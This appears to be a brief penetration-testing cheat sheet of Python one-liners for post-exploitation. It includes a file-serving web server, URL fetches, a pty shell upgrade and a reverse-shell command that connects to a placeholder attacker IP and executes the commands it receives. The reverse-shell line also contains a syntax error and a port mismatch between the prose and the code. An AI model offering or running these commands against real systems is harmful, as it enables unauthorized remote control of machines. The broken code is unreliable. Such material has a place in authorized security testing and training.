# Cool Python Tricks

## Starting a quick web server to serve some files (useful for post exploitation)

### In Python 2.x
`python -m SimpleHTTPServer 1337`

### In Python 3.x
`python3 -m http.server 1337`

----
## Pythonic Web Client

### In Python 2.x
`python -c 'import urllib2; print urllib2.urlopen("http://h4cker.org/web").read()' | tee /tmp/file.html`
### In Python 3.x
`python3 -c 'import urllib.request; urllib.request.urlretrieve ("http://h4cker.org/web","/tmp/h4cker.html")'`

----
## Python Debugger
This imports a Python file and runs the debugger automatically. This is useful for debugging Python-based malware and for post-exploitation.

`python -m pdb <some_python_file>`

Refer to this [Python Debugger cheatsheet](https://kapeli.com/cheat_sheets/Python_Debugger.docset/Contents/Resources/Documents/index) if you are not familiar with the Python Debugger.

----

## Shell to Terminal
This is useful after exploitation and getting a shell. It allows you to use Linux commands that require a terminal session (e.g., su, sudo, vi, etc.)

`python -c 'import pty; pty.spawn("/bin/bash")'`

----

## Using Python to do a Reverse Shell

You put your IP address (instead of 10.1.1.1) and the port (instead of 13337) below:

`python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('10.1.1.1',1337>))\n while 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"`
